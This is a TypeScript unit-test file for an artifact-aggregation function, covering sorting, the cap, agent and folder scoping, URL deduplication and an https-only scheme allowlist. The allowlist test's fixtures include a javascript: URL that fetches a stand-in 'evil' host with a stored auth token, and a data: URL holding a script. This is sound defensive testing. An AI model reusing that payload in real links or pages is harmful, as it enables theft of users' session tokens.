// artifacts-aggregate.test.ts — unit tests for the pure artifact-aggregation
// function (ordering, cap, per-agent/folder scoping, an honest title).
import { describe, it, expect } from 'vitest'
import { aggregateArtifacts, ARTIFACTS_CAP, type ArtifactSessionEntry } from '../src/artifacts-aggregate.js'

function entry(overrides: Partial<ArtifactSessionEntry> = {}): ArtifactSessionEntry {
  return {
    folder: '-tmp-p',
    id: 's1',
    cwd: '/tmp/p',
    agentId: 'finance',
    sessionTitle: 'FINANCE Session',
    artifacts: [],
    ...overrides,
  }
}

describe('aggregateArtifacts', () => {
  it("flattens and sorts by ts desc, with title = the path's last segment", () => {
    const { artifacts, total } = aggregateArtifacts([
      entry({
        artifacts: [
          { path: '/tmp/a/report.html', url: 'https://x/1', ts: '2026-08-19T10:00:00.000Z' },
          { path: '/tmp/a/notes.md', url: 'https://x/2', ts: '2026-08-20T10:00:00.000Z' },
        ],
      }),
      entry({
        id: 's2',
        sessionTitle: 'Other',
        artifacts: [{ path: '/tmp/b/dash.html', url: 'https://x/3', ts: '2026-08-21T10:00:00.000Z' }],
      }),
    ])
    expect(total).toBe(3)
    expect(artifacts.map((a) => a.title)).toEqual(['dash.html', 'notes.md', 'report.html'])
    expect(artifacts[0]).toMatchObject({
      url: 'https://x/3',
      path: '/tmp/b/dash.html',
      sessionKey: '-tmp-p/s2',
      sessionTitle: 'Other',
      agentId: 'finance',
    })
  })

  it('an invalid/empty ts sorts last, without crashing', () => {
    const { artifacts } = aggregateArtifacts([
      entry({
        artifacts: [
          { path: '/a/no-ts.html', url: 'https://x/1', ts: '' },
          { path: '/a/with-ts.html', url: 'https://x/2', ts: '2026-08-20T10:00:00.000Z' },
        ],
      }),
    ])
    expect(artifacts.map((a) => a.title)).toEqual(['with-ts.html', 'no-ts.html'])
  })

  it('caps at ARTIFACTS_CAP but total counts everything', () => {
    const many = Array.from({ length: ARTIFACTS_CAP + 5 }, (_, i) => ({
      path: `/tmp/a/${i}.html`,
      url: `https://x/${i}`,
      ts: new Date(1_700_000_000_000 + i * 1000).toISOString(),
    }))
    const { artifacts, total } = aggregateArtifacts([entry({ artifacts: many })])
    expect(total).toBe(ARTIFACTS_CAP + 5)
    expect(artifacts).toHaveLength(ARTIFACTS_CAP)
    // the 200 most recent: newest first, oldest cut off.
    expect(artifacts[0]!.title).toBe(`${ARTIFACTS_CAP + 4}.html`)
    expect(artifacts.at(-1)!.title).toBe('5.html')
  })

  it('scoping by agent', () => {
    const { artifacts, total } = aggregateArtifacts(
      [
        entry({ agentId: 'finance', artifacts: [{ path: '/a/x.html', url: 'https://x/1', ts: '2026-08-20T10:00:00.000Z' }] }),
        entry({ id: 's2', agentId: 'ux', artifacts: [{ path: '/a/y.html', url: 'https://x/2', ts: '2026-08-20T11:00:00.000Z' }] }),
      ],
      { agent: 'ux' },
    )
    expect(total).toBe(1)
    expect(artifacts[0]).toMatchObject({ title: 'y.html', agentId: 'ux' })
  })

  it('scoping by folder: an exact cwd or hanging off it; a null cwd is excluded', () => {
    const base = [
      entry({ cwd: '/tmp/p', artifacts: [{ path: '/a/inside.html', url: 'https://x/1', ts: '2026-08-20T10:00:00.000Z' }] }),
      entry({ id: 's2', cwd: '/tmp/p/sub', artifacts: [{ path: '/a/sub.html', url: 'https://x/2', ts: '2026-08-20T11:00:00.000Z' }] }),
      // a string prefix but NOT a subfolder — must not slip through.
      entry({ id: 's3', cwd: '/tmp/p-other', artifacts: [{ path: '/a/outside.html', url: 'https://x/3', ts: '2026-08-20T12:00:00.000Z' }] }),
      entry({ id: 's4', cwd: null, artifacts: [{ path: '/a/no-cwd.html', url: 'https://x/4', ts: '2026-08-20T13:00:00.000Z' }] }),
    ]
    const { artifacts, total } = aggregateArtifacts(base, { folder: '/tmp/p' })
    expect(total).toBe(2)
    expect(artifacts.map((a) => a.title)).toEqual(['sub.html', 'inside.html'])
  })

  // frame-link entries are foreign data — a URL with a non-https scheme
  // (javascript:, data:, http:, whatever) gets DISCARDED during
  // aggregation and never travels to the client as a clickable row.
  it('scheme allowlist: only https:// survives; javascript:/data:/http: are discarded', () => {
    const { artifacts, total } = aggregateArtifacts([
      entry({
        artifacts: [
          { path: '/a/bad.html', url: "javascript:fetch('https://evil/?t='+localStorage.getItem('silos-token'))", ts: '2026-08-21T10:00:00.000Z' },
          { path: '/a/data.html', url: 'data:text/html,<script>alert(1)</script>', ts: '2026-08-21T10:00:01.000Z' },
          { path: '/a/plain.html', url: 'http://localhost:3210/x', ts: '2026-08-21T10:00:02.000Z' },
          { path: '/a/good.html', url: 'https://claude.ai/a/1', ts: '2026-08-21T10:00:03.000Z' },
        ],
      }),
    ])
    expect(total).toBe(1)
    expect(artifacts).toHaveLength(1)
    expect(artifacts[0]).toMatchObject({ title: 'good.html', url: 'https://claude.ai/a/1' })
  })

  // the harness re-emits frame-link for the same artifact on every
  // redeploy — same URL, an increasing ts. Only the most recent occurrence
  // per URL survives, and total counts the deduped result.
  it('dedup by URL: the most recent one survives, within and across sessions; total is deduped', () => {
    const { artifacts, total } = aggregateArtifacts([
      entry({
        artifacts: [
          { path: '/a/report.html', url: 'https://claude.ai/a/1', ts: '2026-08-20T10:00:00.000Z' },
          { path: '/a/report.html', url: 'https://claude.ai/a/1', ts: '2026-08-20T12:00:00.000Z' },
        ],
      }),
      entry({
        id: 's2',
        sessionTitle: 'Later redeploy',
        artifacts: [
          { path: '/a/report.html', url: 'https://claude.ai/a/1', ts: '2026-08-21T09:00:00.000Z' },
          { path: '/a/other.html', url: 'https://claude.ai/a/2', ts: '2026-08-20T11:00:00.000Z' },
        ],
      }),
    ])
    expect(total).toBe(2)
    expect(artifacts.map((a) => a.url)).toEqual(['https://claude.ai/a/1', 'https://claude.ai/a/2'])
    // the surviving occurrence is the MOST RECENT one (s2's redeploy)
    expect(artifacts[0]).toMatchObject({ ts: '2026-08-21T09:00:00.000Z', sessionKey: '-tmp-p/s2', sessionTitle: 'Later redeploy' })
  })

  // both filters at once — a real intersection.
  it('combined agent+folder scoping', () => {
    const base = [
      entry({ agentId: 'finance', cwd: '/tmp/p', artifacts: [{ path: '/a/yes.html', url: 'https://x/1', ts: '2026-08-20T10:00:00.000Z' }] }),
      entry({
        id: 's2',
        agentId: 'finance',
        cwd: '/tmp/other',
        artifacts: [{ path: '/a/folder-no.html', url: 'https://x/2', ts: '2026-08-20T11:00:00.000Z' }],
      }),
      entry({ id: 's3', agentId: 'ux', cwd: '/tmp/p', artifacts: [{ path: '/a/agent-no.html', url: 'https://x/3', ts: '2026-08-20T12:00:00.000Z' }] }),
    ]
    const { artifacts, total } = aggregateArtifacts(base, { agent: 'finance', folder: '/tmp/p' })
    expect(total).toBe(1)
    expect(artifacts[0]).toMatchObject({ title: 'yes.html', agentId: 'finance' })
  })

  it('an honest empty result: no artifacts, empty list and total 0', () => {
    expect(aggregateArtifacts([entry()])).toEqual({ artifacts: [], total: 0 })
    expect(aggregateArtifacts([])).toEqual({ artifacts: [], total: 0 })
  })
})

describe('title: the published page title when the accumulator captured one, else the file name', () => {
  it('prefers a.title over the path basename', () => {
    const { artifacts } = aggregateArtifacts([
      {
        folder: 'f',
        id: 's',
        cwd: '/p',
        agentId: 'finance',
        sessionTitle: 'S',
        artifacts: [{ path: '/tmp/s/plan-bpmn.html', url: 'https://claude.ai/a/1', ts: '2026-08-26T10:00:00Z', title: 'Regularization — map' }],
      },
    ])
    expect(artifacts[0]).toMatchObject({ title: 'Regularization — map', path: '/tmp/s/plan-bpmn.html' })
  })
})
